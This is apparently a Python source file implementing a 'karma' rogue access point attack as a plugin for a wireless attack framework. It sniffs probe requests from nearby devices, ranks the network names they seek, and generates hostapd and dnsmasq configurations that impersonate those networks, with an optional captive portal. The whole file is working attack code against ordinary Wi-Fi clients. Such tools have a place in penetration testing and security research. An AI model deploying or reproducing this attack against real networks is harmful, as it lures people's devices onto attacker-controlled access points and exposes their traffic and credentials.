"""
Implementation of the karma attack as an airscanner plugin
"""
import pyric.pyw as pyw
from AuxiliaryModules.aplauncher import APLauncher
from AuxiliaryModules.dnsmasqhandler import DNSMasqHandler
from AuxiliaryModules.packet import Beacon, ProbeRequest, ProbeResponse
from utils.networkmanager import NetworkCard
from utils.utils import NetUtils
from plugin import AirScannerPlugin, AirHostPlugin
from random import randint
from scapy.all import Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq, Dot11ProbeResp, sniff
from threading import Thread
from time import sleep

#TODO choose AP's to launch by popularity
#Read from a list of saved ssids and configure them if already known
class Karma(AirHostPlugin):

	def __init__(self):
		super(Karma, self).__init__("karma")
		self.scan_time = self.config["scan_time"]
		# It will configure the hostapd file according
		self.ap_interface = self.config["ap_interface"]
		self.max_access_points = self.config["max_access_points"]
		self.dnsmasq_conf = self.config["dnsmasq_conf"]
		self.hostapd_conf = self.config["hostapd_conf"]
		self.aplauncher 	= None
		self.dnsmasqhandler = None
		self.ghost_ap = self.config["ghost_ap"].lower() == "true"
		self.captive_portal = self.config["captive_portal_mode"].lower() == "true"

		self.present_networks	= set()
		self.lonely_probes		= set()
		self.hit_count			= {} #ssid: count
		self.number_of_configured_nets = 0

		self.should_stop = False

	def pre_start(self):
		#Prepare Threads
		sniffer_thread 	= Thread(target=self.sniff_packets)
		printer_thread	= Thread(target=self.print_status)

		#Start Threads and Timer
		sniffer_thread.start()
		printer_thread.start()
		self.stop_timer()

		#Wait for sniffer to finish
		sniffer_thread.join()

		self.post_scanning_configurations()

	# Has to reconfigure interfaces after they are set up
	def post_start(self):
		# Wait for hostapd to setup all the access points
		sleep(1)
		card = NetworkCard(self.ap_interface)
		if card != None:
			gateway = card.get_ip()
			for i in range(self.number_of_configured_nets-1):
				interface_name = "{}_{}".format(self.ap_interface, i)
				if interface_name in pyw.winterfaces():
					gateway = ".".join(gateway.split(".")[0:2] + [str(int(gateway.split(".")[2]) + 1)] + [gateway.split(".")[3]])
					NetUtils().interface_config(interface_name, card.get_ip())
					NetUtils().set_interface_mtu(interface_name, 1800)
					NetUtils().accept_forwarding(interface_name)
		self.dnsmasqhandler.start_dnsmasq()

	def print_status(self):
		print "[+] Starting Karma Sniffer thread and timer for {} seconds".format(self.scan_time)
		seconds = 0
		while seconds < int(self.scan_time):
			sleep(5)
			seconds += 5
			print "[+] Karma Sniffer running for {} seconds".format(seconds)
			print "[/] Probed ssids so far:"
			for ssid, count in self.hit_count.iteritems():
				print "\t", ssid, count
		print "[+] Karma Sniffer finished scanning, will now configure hostapd"

	def sniff_packets(self):
		card = NetworkCard(self.ap_interface)
		if card.get_mode() != "monitor":
			card.set_mode("monitor")
		try:
			sniff(iface=self.ap_interface, store=0, prn=self.handle_packet, stop_filter= (lambda pkt: self.should_stop))
		except Exception as e:
			print e
			print "[-] Exception occurred while sniffing on interface '{}'".format(self.ap_interface)
		self.should_stop = False
		if card.get_mode() != "managed":
			card.set_mode("managed")

	def stop_timer(self):
		try:
			sleep(int(self.scan_time))
		except:
			print "[-] Karma scan time must be integer. Defaulting to 30 seconds."
			sleep(30)

		self.should_stop = True

	def handle_packet(self, packet):
		is_client_packet = False

		if Dot11Beacon in packet:
			packet = Beacon(packet)
		elif Dot11ProbeResp in packet:
			packet = ProbeResponse(packet)
		elif Dot11ProbeReq in packet:
			packet = ProbeRequest(packet)
			is_client_packet = True
		else:
			return

		if is_client_packet and packet.ssid != None and packet.ssid != "":
			self.lonely_probes.add(packet.ssid)
			try:
				self.hit_count[packet.ssid] += 1
			except:
				self.hit_count[packet.ssid] = 1
		else:
			self.present_networks.add(packet.ssid)

		if self.ghost_ap:
			self.lonely_probes -= self.present_networks

	def post_scanning_configurations(self):
		# Escrever num ficheiro depois ler se for chamado no airhost
		card = NetworkCard(self.ap_interface)
		max_supported_access_points = card.get_number_of_supported_aps()
		if self.max_access_points > max_supported_access_points:
			print "[-] max_access_points is higher than what card supports. Setting to {}".format(max_supported_access_points)
			self.max_access_points = max_supported_access_points

		self.aplauncher 		= APLauncher(self.hostapd_conf)
		self.dnsmasqhandler 	= DNSMasqHandler(self.dnsmasq_conf)
		rand_mac = "52:54:00:%02x:%02x:%02x" % (randint(0, 255), 
												randint(0, 255),
												randint(0, 255))
		final_list = []
		if len(self.lonely_probes) < self.max_access_points:
			print "[+] Adding all requested ssids to hostapd configuration."
			for probe in self.lonely_probes:
				print "[+] Adding '{}' with hit_count '{}' to hostapd configuration".format(probe, 
																							self.hit_count[probe])
			final_list = list(self.lonely_probes)
		else:
			inverted_popular_ssids = { hit_count : ssid for ssid, hit_count in self.hit_count.iteritems() }
			ordered_popularity = sorted(inverted_popular_ssids.keys())[::-1]
			for i in ordered_popularity:
				popular_ssid = inverted_popular_ssids[i]
				final_list.append(popular_ssid)
				print "[+] Adding '{}' with hit_count '{}' to hostapd configuration".format(popular_ssid, 
																							self.hit_count[popular_ssid])
				if len(final_list) == self.max_access_points:
					break

		self.number_of_configured_nets = len(final_list)
		self.dnsmasqhandler.set_captive_portal_mode(self.captive_portal)
		self.dnsmasqhandler.write_dnsmasq_configurations(self.ap_interface, 
													card.get_ip(), 
													[	".".join(card.get_ip().split(".")[:3] + ["2"]), 
														".".join(card.get_ip().split(".")[:3] + ["254"])	], 
													["8.8.8.8", "8.8.4.4"],
													len(final_list))

		self.aplauncher.write_hostapd_configurations(self.ap_interface, 
												final_list,
												rand_mac)


